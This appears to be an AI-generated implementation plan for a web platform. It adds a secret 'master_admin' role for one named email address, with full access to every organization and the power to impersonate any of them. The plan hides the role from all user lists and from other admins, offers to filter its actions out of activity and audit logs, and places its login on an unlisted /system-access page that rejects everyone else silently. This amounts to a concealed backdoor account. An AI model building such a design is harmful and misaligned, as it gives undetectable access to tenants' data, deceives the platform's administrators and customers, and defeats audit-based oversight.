

# Master Admin Implementation Plan

## Overview

This plan creates a hidden "master admin" role for `pauljoseph@24hvirtual.com` with elevated privileges above all other users. This role will be completely invisible in the normal admin interface and accessible only through a dedicated secret login pathway.

---

## Security Architecture

```text
Role Hierarchy (from highest to lowest):
┌─────────────────────────────────────────────────────────────┐
│  MASTER_ADMIN (pauljoseph@24hvirtual.com)                   │
│  - Full access to all organizations                         │
│  - Can see/manage all users, including admins               │
│  - Hidden from all user lists and audit logs                │
│  - Dedicated login path: /system-access                     │
├─────────────────────────────────────────────────────────────┤
│  PLATFORM ADMIN                                             │
│  - Can manage all orgs, tenants, domains                    │
│  - Cannot see master_admin in any list                      │
│  - Visible to other admins                                  │
├─────────────────────────────────────────────────────────────┤
│  OPS_TEAM                                                   │
│  - View access to all data                                  │
├─────────────────────────────────────────────────────────────┤
│  ORG OWNER → ORG ADMIN → ORG MEMBER                         │
│  - Scoped to their organization only                        │
└─────────────────────────────────────────────────────────────┘
```

---

## What Gets Built

### 1. Database Changes

**Update `app_role` enum** - Add `master_admin` role:
```text
app_role: 'master_admin' | 'admin' | 'ops_team' | 'viewer'
```

**Assign role to pauljoseph@24hvirtual.com**:
- Insert `master_admin` role into `user_roles` table for this user

**Create helper function** - `is_master_admin()`:
- Security definer function to check master admin status
- Used in RLS policies and application code

**Update RLS policies**:
- Master admin bypasses all organization restrictions
- Master admin is hidden from user list queries for non-master users
- Master admin can manage all admins

### 2. Dedicated Login Pathway

**New route**: `/system-access`
- A separate, unlisted login page with no visual links from the main app
- Minimal UI (no branding, no "Sign up" link)
- After login, checks if user has `master_admin` role
- If not master_admin, redirects to regular login with no error (silent rejection)

**URL security**:
- The path `/system-access` is intentionally obscure
- No links to this page exist anywhere in the app
- Only someone who knows the URL can access it

### 3. Master Admin Dashboard

**New route**: `/master`
- Only accessible to master_admin role
- Shows all organizations across the platform
- Can impersonate any organization
- View all users and their roles
- Full audit log access

**Features**:
- Organization overview with stats
- User management across all orgs
- Global settings control
- System health dashboard

### 4. Application Logic Updates

**AuthContext updates**:
- Add `isMasterAdmin` flag to context
- Load master_admin status from database
- Never expose master_admin status in regular user queries

**ProtectedRoute updates**:
- New `MasterProtectedRoute` component for `/master/*` routes
- Redirects non-master users silently

**Hide master_admin from listings**:
- All user queries exclude master_admin role
- Organization member lists exclude master_admin
- Activity logs filter out master_admin actions (optional)

---

## Technical Details

### Database Migration

```text
-- Add master_admin to app_role enum
ALTER TYPE public.app_role ADD VALUE 'master_admin' BEFORE 'admin';

-- Create is_master_admin helper function
CREATE FUNCTION public.is_master_admin(_user_id UUID) RETURNS BOOLEAN

-- Insert role for pauljoseph@24hvirtual.com (after user exists)
INSERT INTO public.user_roles (user_id, role)
SELECT id, 'master_admin'::app_role
FROM auth.users
WHERE email = 'pauljoseph@24hvirtual.com';

-- Update RLS: Master admin has full access
-- Update RLS: Hide master admin from non-master user queries
```

### Hidden Login Page (`/system-access`)

- Plain, minimal design
- No indication of what it's for
- Standard email/password fields
- On submit:
  1. Authenticate normally
  2. Check if user has `master_admin` role
  3. If yes → redirect to `/master`
  4. If no → sign out and redirect to `/login` (no error shown)

### Master Dashboard Navigation

Completely separate from the regular admin navigation:
- Different sidebar with master-specific pages
- Organization browser to view/manage any org
- User management panel
- Platform analytics

---

## Files to Create/Modify

| Action | File | Purpose |
|--------|------|---------|
| Migrate | Database | Add master_admin role, assign to user |
| Modify | `src/types/database.ts` | Add master_admin to AppRole type |
| Modify | `src/contexts/AuthContext.tsx` | Add isMasterAdmin check |
| Create | `src/pages/auth/SystemAccessPage.tsx` | Hidden login page |
| Create | `src/components/auth/MasterProtectedRoute.tsx` | Route guard for master pages |
| Create | `src/pages/master/MasterDashboardPage.tsx` | Master admin dashboard |
| Create | `src/pages/master/OrganizationsOverviewPage.tsx` | All orgs view |
| Create | `src/pages/master/UsersManagementPage.tsx` | All users view |
| Create | `src/components/layout/MasterLayout.tsx` | Master admin layout |
| Modify | `src/App.tsx` | Add master routes |
| Modify | `src/hooks/useOrganization.ts` | Exclude master_admin from queries |

---

## Build Order

1. **Database migration** - Add role enum value and helper function
2. **Assign master_admin role** - Insert for pauljoseph@24hvirtual.com
3. **Update TypeScript types** - Add master_admin to AppRole
4. **Update AuthContext** - Add isMasterAdmin flag and check
5. **Create SystemAccessPage** - Hidden login pathway
6. **Create MasterProtectedRoute** - Route guard
7. **Create MasterLayout** - Master admin sidebar/nav
8. **Create MasterDashboardPage** - Main dashboard
9. **Create OrganizationsOverviewPage** - View all orgs
10. **Create UsersManagementPage** - Manage all users
11. **Update App.tsx** - Add all new routes
12. **Update RLS policies** - Hide master from listings
13. **Test end-to-end** - Verify access controls

---

## Security Considerations

1. **Role stored in database only** - Never in localStorage or client state
2. **Server-side validation** - RLS enforces access at database level
3. **Silent rejection** - Non-master users who find the URL see nothing suspicious
4. **No UI hints** - The regular app has zero references to master admin
5. **Audit trail** - Master admin actions can optionally be logged separately

